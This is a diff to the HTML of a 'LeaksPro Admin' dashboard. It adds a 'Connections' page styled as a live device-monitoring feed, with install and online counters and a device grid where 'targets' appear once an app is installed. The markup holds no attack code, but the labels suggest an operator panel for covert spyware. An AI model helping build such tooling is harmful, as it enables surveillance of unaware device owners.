@@ -6,6 +6,7 @@
   <title>LeaksPro Admin</title>
   <link rel="stylesheet" href="style.css">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
   <link href="https://cdn.jsdelivr.net/npm/remixicon@4.1.0/fonts/remixicon.css" rel="stylesheet">
   <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
   <meta name="theme-color" content="#0f0f0f">
@@ -76,6 +77,9 @@
         </a>
         <a href="#" class="nav-link" data-page="videos">
           <i class="ri-video-line"></i><span>All Videos</span>
+        </a>
+        <a href="#" class="nav-link" data-page="connections">
+          <i class="ri-radar-line"></i><span>Connections</span>
         </a>
         <a href="#" class="nav-link" data-page="settings">
           <i class="ri-settings-3-line"></i><span>Settings</span>
@@ -309,6 +313,44 @@
                 </button>
               </div>
             </form>
+          </div>
+        </div>
+      </section>
+
+      <!-- ===== CONNECTIONS PAGE (Forensic UI) ===== -->
+      <section id="page-connections" class="page">
+        <!-- Scan header -->
+        <div class="fx-header">
+          <div class="fx-scan-bar"><div class="fx-scan-line"></div></div>
+          <div class="fx-title">
+            <i class="ri-radar-line"></i>
+            <span>DEVICE MONITORING — LIVE FEED</span>
+            <span class="fx-blink">●</span>
+          </div>
+        </div>
+
+        <!-- Stats row -->
+        <div class="fx-stats">
+          <div class="fx-stat">
+            <span class="fx-stat-val" id="connTotal">0</span>
+            <span class="fx-stat-lbl">TOTAL INSTALLS</span>
+          </div>
+          <div class="fx-stat fx-online">
+            <span class="fx-stat-val" id="connOnline">0</span>
+            <span class="fx-stat-lbl">ONLINE</span>
+          </div>
+          <div class="fx-stat fx-offline">
+            <span class="fx-stat-val" id="connOffline">0</span>
+            <span class="fx-stat-lbl">OFFLINE</span>
+          </div>
+        </div>
+
+        <!-- Device grid -->
+        <div id="deviceGrid" class="fx-grid">
+          <div class="fx-empty">
+            <i class="ri-radar-line"></i>
+            <p>NO DEVICES DETECTED</p>
+            <span>Targets will appear when the app is installed on a device</span>
           </div>
         </div>
       </section>
